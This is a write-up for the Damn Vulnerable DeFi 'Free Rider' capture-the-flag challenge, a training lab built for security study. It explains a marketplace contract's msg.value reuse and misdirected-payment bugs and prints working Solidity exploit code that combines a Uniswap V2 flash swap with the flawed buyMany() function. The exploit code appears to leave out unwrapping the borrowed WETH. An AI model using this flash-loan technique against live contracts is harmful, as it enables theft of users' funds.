# Damn Vulnerable DeFi #10 - Free Rider - Solution

## Summary

This article outlines a solution for Damn Vulnerable DeFi Challenge #10: *Free Rider*.
Two key vulnerabilities were exploited:
  * **Improper `msg.value` reuse in loops**, leading to faulty payment validation.
  * **Incorrect payment distribution**, where funds were mistakenly sent to the buyer instead of the seller.
The challenge also highlights the existence and potential use of Uniswap V2’s flash loan feature.

## Link to the challenge

[https://www.damnvulnerabledefi.xyz/challenges/free-rider/](https://www.damnvulnerabledefi.xyz/challenges/free-rider/)

## The Challenge

```
A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.
```

## Vulnerability Survey

### Improper `msg.value` Reuse in Loops

Although the `buyMany()` function is protected against reentrancy, the `_buyOne()` function reuses `msg.value` without updating it on each iteration. This causes a flaw where the same `msg.value` is applied across multiple iterations.

Let’s illustrate this with a simple table:

| id  | priceToPay | total  | msg.value | sold? | commentary                              |
|-----|------------|--------|-----------|-------|-----------------------------------------|
| 0   | 15 ETH     | 15 ETH | 15 ETH    | yes   | OK                                      |
| 1   | 15 ETH     | 30 ETH | 15 ETH    | yes   | Wait! Why? You should have discounted it before |
| 2   | 15 ETH     | 45 ETH | 15 ETH    | yes   | Still using the same `msg.value`, causing improper validation |


This behavior occurs due to the following code:

```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]);
        }
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

### Incorrect Payment Distribution

To add to the contract's issues, let’s examine this snippet from `_buyOne()`:

```solidity
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller using cached token
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

In this case, the NFT is transferred to the buyer first, making them the owner of the token. The next line then sends the payment to the owner, which is now the buyer, allowing them to receive the funds instead of the seller.

## Solution

### Issue a Flash Loan

To execute the attack, we need at least the price of one NFT (we only have 0.1 ETH!). Flash swaps are a built-in feature of Uniswap V2 [Reference](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap-1).

For regular swaps, `data.length` must be 0. However, if `data.length > 0`, the `uniswapV2Call()` function is invoked, passing the `data` parameter back to the caller.

Here’s the relevant code to initiate the swap:

```solidity
function test_freeRider() public checkSolvedByPlayer {
    uniswapPair.swap(
        NFT_PRICE,
        0,
        address(this),
        abi.encode(0)
    );
}
```

The `onERC721Received()` function also needs to be implemented as shown below:

```solidity
function onERC721Received(address, address, uint256, bytes calldata)
    external pure returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
}
```

### Exploit `buyMany()`

The `buyMany()` function iterates over the provided IDs and calls `_buyOne()` for each NFT. However, because `msg.value` is reused across iterations, an attacker can use the value of the most expensive item to bypass validation and acquire all requested items in a single transaction.

The rest of the attack involves cleanup steps: sending the NFTs to the `RecoveryManager` contract, repaying the flash loan (including minting WETH to cover the fee), and transferring all collected ETH to the `player` account.

Here’s the full exploit code:

```solidity
function uniswapV2Call(address, uint256 amount, uint256, bytes calldata) external {
    uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
    for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
        ids[i] = i;
    }
    marketplace.buyMany{value: NFT_PRICE}(ids);

    // Recovery Manager interaction
    bytes memory data = abi.encode(address(this));
    for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
        nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
    }

    // Repay the flash loan
    uint256 fee = ((amount * 3) / 997) + 1;
    weth.deposit{value: fee}();
    uint256 amountToRepay = amount + fee;
    weth.transfer(address(uniswapPair), amountToRepay);

    // Send the bounty to the player
    payable(player).transfer(BOUNTY);
}
```
